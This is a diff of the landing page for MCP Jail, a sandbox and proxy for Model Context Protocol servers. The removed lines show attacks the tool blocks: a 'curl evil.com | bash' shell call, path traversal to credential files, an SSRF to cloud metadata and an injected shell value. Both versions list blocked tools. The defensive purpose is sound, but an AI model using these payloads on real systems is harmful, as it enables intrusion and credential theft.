@@ -27,17 +27,23 @@
     </div>
   </nav>
 
-  <!-- Hero - Compact -->
+  <!-- Hero -->
   <section class="hero">
-    <div class="hero-content">
-      <p class="hero-label">SECURE MCP SERVER SANDBOX</p>
-      <h1 class="hero-title">Run any MCP server with<br><span class="accent">zero trust, zero risk.</span></h1>
-      <p class="hero-desc">Drop-in Docker containerization with protocol-level security enforcement.</p>
-      <div class="install-box">
-        <code class="install-cmd">curl -fsSL https://mcpjail.com/install.sh | sh</code>
-        <button class="copy-btn" onclick="copyCmd()">COPY</button>
+    <div class="hero-frame">
+      <div class="hero-content">
+        <p class="hero-label">SECURE MCP SERVER SANDBOX</p>
+        <h1 class="hero-title">Run any MCP server with<br><span class="accent">zero trust, zero risk.</span></h1>
+
+        <div class="divider"><div class="divider-symbol"></div></div>
+
+        <p class="hero-desc">Drop-in Docker containerization with protocol-level security enforcement for Model Context Protocol servers.</p>
+
+        <div class="install-box">
+          <code class="install-cmd">curl -fsSL https://mcpjail.com/install.sh | sh</code>
+          <button class="copy-btn" onclick="copyCmd()">COPY</button>
+        </div>
+        <p class="install-note">Works on macOS, Linux, and Windows (WSL2)</p>
       </div>
-      <p class="install-note">macOS &#183; Linux &#183; Windows (WSL2)</p>
     </div>
   </section>
 
@@ -49,25 +55,30 @@
         <h2 class="section-title">The Problem</h2>
       </div>
 
-      <p class="intro-text">Our security audit of <strong>501 MCP servers</strong> revealed critical vulnerabilities. MCP clients run servers with full user privileges - if compromised, attackers gain complete access.</p>
+      <p class="intro-text">Our security audit of <strong>501 MCP servers</strong> revealed critical vulnerabilities across the ecosystem. MCP clients like Claude Desktop and Cursor run servers with full user privileges - if compromised, attackers gain complete access to your machine.</p>
 
       <div class="stats-grid">
-        <div class="stat-block" data-tooltip="484 of 501 servers have at least one exploitable vulnerability">
+        <div class="stat-block">
           <div class="stat-value">96.4%</div>
-          <div class="stat-label">EXPLOITABLE VULNS</div>
+          <div class="stat-label">EXPLOITABLE VULNERABILITIES</div>
         </div>
-        <div class="stat-block" data-tooltip="352 servers can spawn shell processes via subprocess or os.system">
+        <div class="stat-block">
           <div class="stat-value">70.3%</div>
           <div class="stat-label">SHELL EXECUTION</div>
         </div>
-        <div class="stat-block" data-tooltip="468 servers use unpinned dependencies vulnerable to supply chain attacks">
+        <div class="stat-block">
           <div class="stat-value">93.4%</div>
-          <div class="stat-label">UNPINNED DEPS</div>
+          <div class="stat-label">UNPINNED DEPENDENCIES</div>
         </div>
-        <div class="stat-block" data-tooltip="378 servers can make arbitrary network requests including SSRF">
+        <div class="stat-block">
           <div class="stat-value">75.4%</div>
-          <div class="stat-label">UNRESTRICTED NET</div>
+          <div class="stat-label">UNRESTRICTED NETWORK</div>
         </div>
+      </div>
+
+      <div class="callout callout-critical">
+        <div class="callout-title">Critical Finding</div>
+        <p>1,736 security vulnerabilities identified across 492 repositories including RCE via pickle deserialization (351), exec() injection (268), shell command execution (183), and SSRF vulnerabilities.</p>
       </div>
 
       <div class="report-download">
@@ -82,7 +93,7 @@
     </div>
   </section>
 
-  <!-- Solution Section with Interactive SVG -->
+  <!-- Solution Section -->
   <section class="section" id="solution">
     <div class="container">
       <div class="section-header">
@@ -90,421 +101,153 @@
         <h2 class="section-title">The Solution</h2>
       </div>
 
-      <p class="intro-text">MCP Jail wraps any MCP server in a hardened sandbox with a Rust proxy enforcing security policies at runtime. Click each layer to learn more.</p>
+      <p class="intro-text">MCP Jail is a drop-in replacement that wraps any MCP server command in a hardened Docker container with a Rust-based protocol proxy enforcing security policies at runtime.</p>
 
-      <!-- Interactive Architecture SVG -->
-      <div class="arch-interactive">
-        <svg viewBox="0 0 800 500" class="arch-svg">
-          <!-- Background -->
-          <rect x="20" y="20" width="760" height="460" fill="none" stroke="#1a1a1a" stroke-width="1"/>
-          <text x="400" y="50" text-anchor="middle" class="svg-title">User's Machine</text>
-
-          <!-- MCP Client Box -->
-          <g class="arch-layer" data-layer="client" onclick="showLayer('client')">
-            <rect x="60" y="180" width="140" height="120" fill="#fafafa" stroke="#1a1a1a" stroke-width="2" class="layer-box"/>
-            <text x="130" y="220" text-anchor="middle" class="svg-label">MCP Client</text>
-            <text x="130" y="245" text-anchor="middle" class="svg-sublabel">Claude Desktop</text>
-            <text x="130" y="265" text-anchor="middle" class="svg-sublabel">Cursor, etc.</text>
-            <circle cx="130" cy="290" r="8" fill="#d62828" class="info-dot"/>
-          </g>
-
-          <!-- Arrow 1 -->
-          <path d="M200 230 L280 230" stroke="#1a1a1a" stroke-width="2" marker-end="url(#arrowhead)"/>
-          <path d="M280 250 L200 250" stroke="#1a1a1a" stroke-width="2" marker-end="url(#arrowhead)"/>
-          <text x="240" y="220" text-anchor="middle" class="svg-arrow-label">stdio</text>
-
-          <!-- MCP Jail Proxy Box -->
-          <g class="arch-layer" data-layer="proxy" onclick="showLayer('proxy')">
-            <rect x="280" y="120" width="240" height="240" fill="#fef2f2" stroke="#d62828" stroke-width="2" class="layer-box"/>
-            <text x="400" y="155" text-anchor="middle" class="svg-label-accent">MCP Jail Proxy</text>
-            <text x="400" y="178" text-anchor="middle" class="svg-sublabel">(Rust)</text>
-
-            <rect x="300" y="195" width="200" height="30" fill="#fafafa" stroke="#e5e5e5" rx="2"/>
-            <text x="400" y="215" text-anchor="middle" class="svg-feature">Protocol Validation</text>
-
-            <rect x="300" y="235" width="200" height="30" fill="#fafafa" stroke="#e5e5e5" rx="2"/>
-            <text x="400" y="255" text-anchor="middle" class="svg-feature">Request Filtering</text>
-
-            <rect x="300" y="275" width="200" height="30" fill="#fafafa" stroke="#e5e5e5" rx="2"/>
-            <text x="400" y="295" text-anchor="middle" class="svg-feature">Policy Enforcement</text>
-
-            <rect x="300" y="315" width="200" height="30" fill="#fafafa" stroke="#e5e5e5" rx="2"/>
-            <text x="400" y="335" text-anchor="middle" class="svg-feature">Audit Logging</text>
-
-            <circle cx="400" cy="350" r="8" fill="#d62828" class="info-dot"/>
-          </g>
-
-          <!-- Arrow 2 -->
-          <path d="M520 240 L580 240" stroke="#1a1a1a" stroke-width="2" marker-end="url(#arrowhead)"/>
-          <text x="550" y="230" text-anchor="middle" class="svg-arrow-label">docker</text>
-          <text x="550" y="255" text-anchor="middle" class="svg-arrow-label">exec</text>
-
-          <!-- Docker Container Box -->
-          <g class="arch-layer" data-layer="container" onclick="showLayer('container')">
-            <rect x="580" y="100" width="180" height="280" fill="#f0fdf4" stroke="#065f46" stroke-width="2" class="layer-box"/>
-            <text x="670" y="130" text-anchor="middle" class="svg-label-success">Docker Container</text>
-            <text x="670" y="150" text-anchor="middle" class="svg-sublabel">(Hardened)</text>
-
-            <!-- Inner MCP Server -->
-            <rect x="600" y="170" width="140" height="60" fill="#fafafa" stroke="#1a1a1a" stroke-width="1" rx="2"/>
-            <text x="670" y="200" text-anchor="middle" class="svg-label">MCP Server</text>
-            <text x="670" y="218" text-anchor="middle" class="svg-sublabel">npx/python/node</text>
-
-            <!-- Security features -->
-            <text x="600" y="260" class="svg-security">&#10003; --network=none</text>
-            <text x="600" y="280" class="svg-security">&#10003; read-only rootfs</text>
-            <text x="600" y="300" class="svg-security">&#10003; dropped caps</text>
-            <text x="600" y="320" class="svg-security">&#10003; seccomp profile</text>
-            <text x="600" y="340" class="svg-security">&#10003; resource limits</text>
-
-            <circle cx="670" cy="365" r="8" fill="#065f46" class="info-dot"/>
-          </g>
-
-          <!-- macOS Sandbox Layer (shown conditionally) -->
-          <g class="arch-layer macos-layer" data-layer="macos" onclick="showLayer('macos')">
-            <rect x="560" y="80" width="220" height="320" fill="none" stroke="#737373" stroke-width="1" stroke-dasharray="5,5" rx="5"/>
-            <text x="670" y="410" text-anchor="middle" class="svg-macos">macOS: App Sandbox fallback</text>
-            <circle cx="670" cy="430" r="6" fill="#737373" class="info-dot-small"/>
-          </g>
-
-          <!-- Arrow marker -->
-          <defs>
-            <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
-              <polygon points="0 0, 10 3.5, 0 7" fill="#1a1a1a"/>
-            </marker>
-          </defs>
-        </svg>
-
-        <!-- Layer Info Panels -->
-        <div class="layer-info" id="layer-info">
-          <div class="layer-panel" id="panel-client">
-            <h4>MCP Client</h4>
-            <p>Your AI assistant (Claude Desktop, Cursor, etc.) communicates with MCP servers via stdio. Without MCP Jail, these servers run with your full user privileges.</p>
-            <div class="layer-risk">
-              <span class="risk-badge">RISK</span> Compromised server = full machine access
-            </div>
-          </div>
-
-          <div class="layer-panel" id="panel-proxy">
-            <h4>MCP Jail Proxy</h4>
-            <p>A Rust-based proxy that intercepts all MCP protocol messages. It validates, filters, and enforces policies before forwarding to the sandboxed server.</p>
-            <ul class="layer-features">
-              <li><strong>Protocol Validation</strong> - Parses JSON-RPC, rejects malformed requests</li>
-              <li><strong>Request Filtering</strong> - Blocks path traversal (../), SSRF attempts</li>
-              <li><strong>Policy Enforcement</strong> - Tool allowlists/blocklists, resource limits</li>
-              <li><strong>Audit Logging</strong> - Complete trail of all operations</li>
-            </ul>
-          </div>
-
-          <div class="layer-panel" id="panel-container">
-            <h4>Docker Container (Linux)</h4>
-            <p>The MCP server runs inside a hardened Docker container with multiple isolation layers:</p>
-            <ul class="layer-features">
-              <li><strong>--network=none</strong> - No network access, blocks data exfiltration</li>
-              <li><strong>Read-only rootfs</strong> - Cannot modify system files</li>
-              <li><strong>Dropped capabilities</strong> - No CAP_SYS_ADMIN, CAP_NET_RAW, etc.</li>
-              <li><strong>Seccomp profile</strong> - Blocks dangerous syscalls (execve restrictions)</li>
-              <li><strong>Resource limits</strong> - CPU, memory, PID limits prevent DoS</li>
-            </ul>
-          </div>
-
-          <div class="layer-panel" id="panel-macos">
-            <h4>macOS App Sandbox (Fallback)</h4>
-            <p>When Docker is unavailable, MCP Jail uses macOS App Sandbox for native isolation:</p>
-            <ul class="layer-features">
-              <li><strong>sandbox-exec</strong> - Apple's built-in sandboxing framework</li>
-              <li><strong>File access control</strong> - Restrict to specific directories</li>
-              <li><strong>Network restrictions</strong> - Block outbound connections</li>
-              <li><strong>Process isolation</strong> - Separate from user processes</li>
-            </ul>
-            <div class="layer-note">macOS sandbox is less robust than Docker but provides reasonable protection when Docker isn't available.</div>
-          </div>
+      <div class="comparison">
+        <div class="comparison-box comparison-before">
+          <div class="comparison-header">BEFORE</div>
+          <code class="comparison-cmd">npx -y @modelcontextprotocol/server-filesystem /home/user</code>
+          <ul class="comparison-list danger-list">
+            <li>Full filesystem access</li>
+            <li>Unrestricted network</li>
+            <li>Can execute any command</li>
+            <li>No audit logging</li>
+          </ul>
+        </div>
+        <div class="comparison-arrow">&#8594;</div>
+        <div class="comparison-box comparison-after">
+          <div class="comparison-header">AFTER</div>
+          <code class="comparison-cmd">mcpjail npx -y @modelcontextprotocol/server-filesystem /workspace</code>
+          <ul class="comparison-list safe-list">
+            <li>Isolated in Docker container</li>
+            <li>Network disabled by default</li>
+            <li>Protocol-level filtering</li>
+            <li>Complete audit trail</li>
+          </ul>
         </div>
       </div>
 
       <div class="divider"><div class="divider-symbol"></div></div>
 
-      <!-- Expandable Security Layers -->
-      <h3>Security Layers Explained</h3>
-      <div class="accordion">
-        <div class="accordion-item">
-          <button class="accordion-header" onclick="toggleAccordion(this)">
-            <span class="accordion-icon">+</span>
-            <span class="accordion-title">Layer 1: Tool Filtering</span>
-            <span class="accordion-badge">Blocks 70.3% of attacks</span>
-          </button>
-          <div class="accordion-content">
-            <p>The proxy maintains blocklists of dangerous tool names commonly found in vulnerable MCP servers:</p>
-            <div class="code-inline">
-              <code>execute_command, run_shell, eval, exec, bash, sh, system, run_code, get_env, get_secrets</code>
-            </div>
-            <p>When a tool call matches the blocklist, it's rejected before reaching the server. This stops:</p>
-            <ul>
-              <li>Shell command execution (subprocess.run with shell=True)</li>
-              <li>Dynamic code execution (eval(), exec())</li>
-              <li>Credential/secret exposure</li>
-            </ul>
-          </div>
-        </div>
-
-        <div class="accordion-item">
-          <button class="accordion-header" onclick="toggleAccordion(this)">
-            <span class="accordion-icon">+</span>
-            <span class="accordion-title">Layer 2: Path Validation</span>
-            <span class="accordion-badge">Blocks 76.0% of attacks</span>
-          </button>
-          <div class="accordion-content">
-            <p>All file path arguments are validated to prevent directory traversal:</p>
-            <div class="blocked-examples">
-              <div class="blocked-item">
-                <span class="blocked-attack">../../../etc/passwd</span>
-                <span class="blocked-result">BLOCKED</span>
-              </div>
-              <div class="blocked-item">
-                <span class="blocked-attack">~/.aws/credentials</span>
-                <span class="blocked-result">BLOCKED</span>
-              </div>
-              <div class="blocked-item">
-                <span class="blocked-attack">/etc/shadow</span>
-                <span class="blocked-result">BLOCKED</span>
-              </div>
-            </div>
-            <p>Only paths within explicitly mounted directories are allowed.</p>
-          </div>
-        </div>
-
-        <div class="accordion-item">
-          <button class="accordion-header" onclick="toggleAccordion(this)">
-            <span class="accordion-icon">+</span>
-            <span class="accordion-title">Layer 3: SSRF Protection</span>
-            <span class="accordion-badge">Blocks 75.4% of attacks</span>
-          </button>
-          <div class="accordion-content">
-            <p>URL arguments are validated to prevent Server-Side Request Forgery:</p>
-            <div class="blocked-examples">
-              <div class="blocked-item">
-                <span class="blocked-attack">http://169.254.169.254/</span>
-                <span class="blocked-result">BLOCKED</span>
-                <span class="blocked-reason">AWS metadata</span>
-              </div>
-              <div class="blocked-item">
-                <span class="blocked-attack">http://localhost:8080/admin</span>
-                <span class="blocked-result">BLOCKED</span>
-                <span class="blocked-reason">Internal service</span>
-              </div>
-              <div class="blocked-item">
-                <span class="blocked-attack">http://192.168.1.1/</span>
-                <span class="blocked-result">BLOCKED</span>
-                <span class="blocked-reason">Private network</span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="accordion-item">
-          <button class="accordion-header" onclick="toggleAccordion(this)">
-            <span class="accordion-icon">+</span>
-            <span class="accordion-title">Layer 4: Container Isolation</span>
-            <span class="accordion-badge">Defense in depth</span>
-          </button>
-          <div class="accordion-content">
-            <p>Even if an attack bypasses the proxy filters, the container provides multiple isolation boundaries:</p>
-            <table class="isolation-table">
-              <tr>
-                <td><strong>Namespace isolation</strong></td>
-                <td>Separate PID, network, mount, user namespaces</td>
-              </tr>
-              <tr>
-                <td><strong>Seccomp filtering</strong></td>
-                <td>Only ~50 syscalls allowed (vs ~300+ normally)</td>
-              </tr>
-              <tr>
-                <td><strong>Capability dropping</strong></td>
-                <td>No CAP_SYS_ADMIN, CAP_NET_RAW, CAP_SYS_PTRACE</td>
-              </tr>
-              <tr>
-                <td><strong>Read-only root</strong></td>
-                <td>Cannot modify /usr, /bin, /etc</td>
-              </tr>
-              <tr>
-                <td><strong>No network</strong></td>
-                <td>--network=none blocks all egress</td>
-              </tr>
-            </table>
-          </div>
-        </div>
+      <h3>Architecture</h3>
+      <div class="arch-diagram">
+        <pre class="arch-ascii">
+┌─────────────────────────────────────────────────────────────────┐
+│                         User's Machine                          │
+│  ┌─────────────┐     ┌──────────────────────────────────────┐  │
+│  │ MCP Client  │────▶│           MCP Jail Proxy             │  │
+│  │ (Claude,    │     │         (Rust, stdio)                │  │
+│  │  Cursor)    │◀────│  • MCP Protocol Validation           │  │
+│  └─────────────┘     │  • Request/Response Filtering        │  │
+│                      │  • Policy Enforcement                │  │
+│                      └──────────────┬───────────────────────┘  │
+│                                     │ stdio over docker exec   │
+│                      ┌──────────────▼───────────────────────┐  │
+│                      │     Docker Container (Hardened)      │  │
+│                      │  ┌────────────────────────────────┐  │  │
+│                      │  │        MCP Server              │  │  │
+│                      │  └────────────────────────────────┘  │  │
+│                      │  • No network (--network=none)       │  │
+│                      │  • Read-only rootfs                  │  │
+│                      │  • Dropped capabilities              │  │
+│                      │  • Seccomp profile                   │  │
+│                      │  • Resource limits (CPU/mem)         │  │
+│                      └──────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────────┘</pre>
       </div>
     </div>
   </section>
 
-  <!-- Vulnerability Coverage - Interactive -->
-  <section class="section" id="coverage">
+  <!-- Security Features Section -->
+  <section class="section" id="features">
     <div class="container">
       <div class="section-header">
         <span class="section-num">03</span>
-        <h2 class="section-title">Vulnerability Coverage</h2>
+        <h2 class="section-title">Security Features</h2>
       </div>
 
-      <p class="intro-text">Click each vulnerability to see how MCP Jail blocks it:</p>
-
-      <div class="vuln-interactive">
-        <div class="vuln-card-interactive" onclick="showVuln('mcp012')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP012</span>
-            <span class="vuln-name">Path Traversal</span>
-          </div>
-          <div class="vuln-stat">76.0% of servers</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
-
-        <div class="vuln-card-interactive" onclick="showVuln('mcp013')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP013</span>
-            <span class="vuln-name">Shell Execution</span>
-          </div>
-          <div class="vuln-stat">70.3% of servers</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
-
-        <div class="vuln-card-interactive" onclick="showVuln('mcp017')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP017</span>
-            <span class="vuln-name">SSRF</span>
-          </div>
-          <div class="vuln-stat">75.4% of servers</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
-
-        <div class="vuln-card-interactive" onclick="showVuln('mcp044')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP044</span>
-            <span class="vuln-name">Command Injection</span>
-          </div>
-          <div class="vuln-stat">70.3% of servers</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
-
-        <div class="vuln-card-interactive" onclick="showVuln('mcp021')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP021</span>
-            <span class="vuln-name">Insecure Deserialization</span>
-          </div>
-          <div class="vuln-stat">351 instances</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
-
-        <div class="vuln-card-interactive" onclick="showVuln('mcp041')">
-          <div class="vuln-header">
-            <span class="vuln-id">MCP041</span>
-            <span class="vuln-name">Dynamic Execution</span>
-          </div>
-          <div class="vuln-stat">268 instances</div>
-          <div class="vuln-expand">Click to expand</div>
-        </div>
+      <div class="features-table">
+        <table>
+          <thead>
+            <tr>
+              <th>Protection</th>
+              <th>Description</th>
+              <th>Blocks</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Container Isolation</strong></td>
+              <td>Every MCP server runs in a hardened Docker container with read-only filesystem, dropped capabilities, and seccomp filtering.</td>
+              <td>Container escape, privilege escalation</td>
+            </tr>
+            <tr>
+              <td><strong>Network Control</strong></td>
+              <td>Network disabled by default (--network=none). Allowlist specific hosts when needed.</td>
+              <td>Data exfiltration, SSRF, C2 callbacks</td>
+            </tr>
+            <tr>
+              <td><strong>Protocol Proxy</strong></td>
+              <td>Rust-based MCP protocol proxy validates every JSON-RPC request and response.</td>
+              <td>Path traversal, malformed requests</td>
+            </tr>
+            <tr>
+              <td><strong>Tool Filtering</strong></td>
+              <td>Allowlist or blocklist specific MCP tools. Blocks dangerous patterns like execute_command, eval, shell.</td>
+              <td>RCE, shell injection, code execution</td>
+            </tr>
+            <tr>
+              <td><strong>Path Validation</strong></td>
+              <td>Validates all file paths in requests. Blocks traversal patterns (../) and access outside mounts.</td>
+              <td>Credential theft, config access</td>
+            </tr>
+            <tr>
+              <td><strong>SSRF Protection</strong></td>
+              <td>Blocks access to internal networks, cloud metadata (169.254.x.x), and localhost.</td>
+              <td>Cloud credential theft, internal recon</td>
+            </tr>
+            <tr>
+              <td><strong>Audit Logging</strong></td>
+              <td>Complete audit trail of all MCP operations with tool names, arguments, and responses.</td>
+              <td>Forensics, compliance</td>
+            </tr>
+          </tbody>
+        </table>
       </div>
 
-      <!-- Vuln Detail Panels -->
-      <div class="vuln-detail" id="vuln-detail">
-        <div class="vuln-panel" id="vuln-mcp012">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP012</span> Path Traversal
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>{"name": "read_file", "arguments": {"path": "../../../etc/passwd"}}</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>Path validation in proxy detects <code>../</code> sequences and absolute paths outside allowed mounts. Request rejected before reaching server.</p>
-            </div>
-          </div>
-        </div>
+      <h3>Vulnerability Coverage</h3>
+      <p>Based on our audit findings, MCP Jail blocks these attack vectors:</p>
 
-        <div class="vuln-panel" id="vuln-mcp013">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP013</span> Shell Execution
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>{"name": "run_shell", "arguments": {"command": "curl evil.com | bash"}}</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>Tool blocklist rejects <code>run_shell</code>, <code>bash</code>, <code>execute_command</code>. Even if bypassed, container has no network access.</p>
-            </div>
-          </div>
+      <div class="vuln-grid">
+        <div class="vuln-card">
+          <div class="vuln-id">MCP012</div>
+          <div class="vuln-name">Path Traversal</div>
+          <div class="vuln-prev">76.0% of servers</div>
         </div>
-
-        <div class="vuln-panel" id="vuln-mcp017">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP017</span> SSRF
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>{"name": "fetch_url", "arguments": {"url": "http://169.254.169.254/latest/meta-data/"}}</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>SSRF filter blocks cloud metadata IPs (169.254.x.x), private networks (10.x, 172.16.x, 192.168.x), and localhost. Container network is disabled.</p>
-            </div>
-          </div>
+        <div class="vuln-card">
+          <div class="vuln-id">MCP013</div>
+          <div class="vuln-name">Shell Execution</div>
+          <div class="vuln-prev">70.3% of servers</div>
         </div>
-
-        <div class="vuln-panel" id="vuln-mcp044">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP044</span> Command Injection
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>{"name": "search_files", "arguments": {"pattern": "'; cat /etc/passwd #"}}</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>Tool blocklist blocks <code>search_files</code>, <code>find_files</code>. Seccomp profile restricts shell spawning. No sensitive files mounted.</p>
-            </div>
-          </div>
+        <div class="vuln-card">
+          <div class="vuln-id">MCP017</div>
+          <div class="vuln-name">SSRF</div>
+          <div class="vuln-prev">75.4% of servers</div>
         </div>
-
-        <div class="vuln-panel" id="vuln-mcp021">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP021</span> Insecure Deserialization
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>pickle.loads(untrusted_data)  # RCE via __reduce__</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>Container isolation contains the blast radius. Seccomp blocks dangerous syscalls. No network for reverse shells. Resource limits prevent fork bombs.</p>
-            </div>
-          </div>
+        <div class="vuln-card">
+          <div class="vuln-id">MCP044</div>
+          <div class="vuln-name">Command Injection</div>
+          <div class="vuln-prev">70.3% of servers</div>
         </div>
-
-        <div class="vuln-panel" id="vuln-mcp041">
-          <div class="vuln-panel-header">
-            <span class="vuln-id">MCP041</span> Dynamic Execution
-            <button class="close-btn" onclick="closeVuln()">×</button>
-          </div>
-          <div class="vuln-panel-body">
-            <div class="attack-example">
-              <div class="attack-label">ATTACK</div>
-              <code>{"name": "evaluate", "arguments": {"code": "__import__('os').system('id')"}}</code>
-            </div>
-            <div class="protection-example">
-              <div class="protection-label">PROTECTION</div>
-              <p>Tool blocklist blocks <code>eval</code>, <code>evaluate</code>, <code>run_code</code>. Container prevents system access even if code executes.</p>
-            </div>
-          </div>
+        <div class="vuln-card">
+          <div class="vuln-id">MCP021</div>
+          <div class="vuln-name">Insecure Deserialization</div>
+          <div class="vuln-prev">Critical RCE</div>
+        </div>
+        <div class="vuln-card">
+          <div class="vuln-id">MCP041</div>
+          <div class="vuln-name">Dynamic Execution</div>
+          <div class="vuln-prev">eval()/exec() RCE</div>
         </div>
       </div>
     </div>
@@ -518,48 +261,58 @@
         <h2 class="section-title">Installation</h2>
       </div>
 
-      <div class="install-tabs">
-        <button class="tab-btn active" onclick="showTab('quick')">Quick Install</button>
-        <button class="tab-btn" onclick="showTab('manual')">Manual</button>
-        <button class="tab-btn" onclick="showTab('config')">Claude Desktop</button>
+      <h3>One-Line Install</h3>
+      <div class="code-block">
+        <code>curl -fsSL https://mcpjail.com/install.sh | sh</code>
       </div>
 
-      <div class="tab-content" id="tab-quick">
-        <div class="code-block">
-          <code>curl -fsSL https://mcpjail.com/install.sh | sh</code>
-        </div>
-        <p>Automatically detects your OS and architecture, downloads the correct binary, and installs to <code>/usr/local/bin</code>.</p>
-        <h4>Requirements</h4>
-        <ul class="req-list">
-          <li>Docker installed and running (or macOS for sandbox fallback)</li>
-          <li>macOS, Linux, or Windows with WSL2</li>
-        </ul>
-      </div>
+      <h3>Manual Download</h3>
+      <p>Download the binary for your platform from the <a href="#downloads">downloads section</a> and place in your PATH.</p>
 
-      <div class="tab-content hidden" id="tab-manual">
-        <p>Download the binary for your platform:</p>
-        <table class="downloads-table">
-          <thead>
-            <tr><th>Platform</th><th>Architecture</th><th>Download</th></tr>
-          </thead>
-          <tbody>
-            <tr><td>macOS</td><td>Intel</td><td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-apple-darwin.tar.gz">mcpjail-x86_64-apple-darwin.tar.gz</a></td></tr>
-            <tr><td>macOS</td><td>Apple Silicon</td><td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-apple-darwin.tar.gz">mcpjail-aarch64-apple-darwin.tar.gz</a></td></tr>
-            <tr><td>Linux</td><td>x86_64</td><td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-unknown-linux-gnu.tar.gz">mcpjail-x86_64-unknown-linux-gnu.tar.gz</a></td></tr>
-            <tr><td>Linux</td><td>ARM64</td><td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-aarch64-unknown-linux-gnu.tar.gz">mcpjail-aarch64-unknown-linux-gnu.tar.gz</a></td></tr>
-            <tr><td>Windows</td><td>x86_64</td><td><a href="https://github.com/iwallarm/mcpjail/releases/latest/download/mcpjail-x86_64-pc-windows-msvc.zip">mcpjail-x86_64-pc-windows-msvc.zip</a></td></tr>
-          </tbody>
-        </table>
+      <h3>Requirements</h3>
+      <ul class="req-list">
+        <li>Docker installed and running</li>
+        <li>macOS, Linux, or Windows with WSL2</li>
+      </ul>
+
+      <div class="divider"><div class="divider-symbol"></div></div>
+
+      <h3>Usage Examples</h3>
+
+      <div class="example-block">
+        <div class="example-title">Basic Usage</div>
         <div class="code-block">
-<pre>tar -xzf mcpjail-*.tar.gz
-sudo mv mcpjail /usr/local/bin/
-mcpjail --version</pre>
+          <code>mcpjail npx -y @modelcontextprotocol/server-filesystem /workspace</code>
         </div>
       </div>
 
-      <div class="tab-content hidden" id="tab-config">
-        <p>Update your <code>claude_desktop_config.json</code>:</p>
-        <div class="code-block code-json">
+      <div class="example-block">
+        <div class="example-title">With Network Access</div>
+        <div class="code-block">
+          <code>mcpjail --allow-host api.example.com python -m mcp_server</code>
+        </div>
+      </div>
+
+      <div class="example-block">
+        <div class="example-title">With Write Access</div>
+        <div class="code-block">
+          <code>mcpjail --mount .:/workspace:rw npx -y @some/mcp-server</code>
+        </div>
+      </div>
+
+      <div class="example-block">
+        <div class="example-title">With Strict Policy</div>
+        <div class="code-block">
+          <code>mcpjail --policy strict npx -y @untrusted/mcp-server</code>
+        </div>
+      </div>
+
+      <div class="divider"><div class="divider-symbol"></div></div>
+
+      <h3>Claude Desktop Configuration</h3>
+      <p>Update your <code>claude_desktop_config.json</code>:</p>
+
+      <div class="code-block code-json">
 <pre>{
   "mcpServers": {
     "filesystem": {
@@ -573,161 +326,68 @@ mcpjail --version</pre>
     }
   }
 }</pre>
-        </div>
-        <p>Config file locations:</p>
-        <ul class="req-list">
-          <li><strong>macOS:</strong> <code>~/Library/Application Support/Claude/claude_desktop_config.json</code></li>
-          <li><strong>Linux:</strong> <code>~/.config/Claude/claude_desktop_config.json</code></li>
-          <li><strong>Windows:</strong> <code>%APPDATA%\Claude\claude_desktop_config.json</code></li>
-        </ul>
-      </div>
-
-      <div class="divider"><div class="divider-symbol"></div></div>
-
-      <h3>Usage Examples</h3>
-      <div class="examples-grid">
-        <div class="example-card">
-          <div class="example-title">Basic</div>
-          <code>mcpjail npx -y @modelcontextprotocol/server-filesystem /workspace</code>
-        </div>
-        <div class="example-card">
-          <div class="example-title">With Network</div>
-          <code>mcpjail --allow-host api.example.com python -m mcp_server</code>
-        </div>
-        <div class="example-card">
-          <div class="example-title">Write Access</div>
-          <code>mcpjail --mount .:/workspace:rw npx -y @some/mcp-server</code>
-        </div>
-        <div class="example-card">
-          <div class="example-title">Strict Policy</div>
-          <code>mcpjail --policy strict npx -y @untrusted/mcp-server</code>
-        </div>
       </div>
     </div>
   </section>
 
-  <!-- Policies Section - Interactive -->
+  <!-- Policies Section -->
   <section class="section" id="policies">
     <div class="container">
       <div class="section-header">
         <span class="section-num">05</span>
-        <h2 class="section-title">Policies</h2>
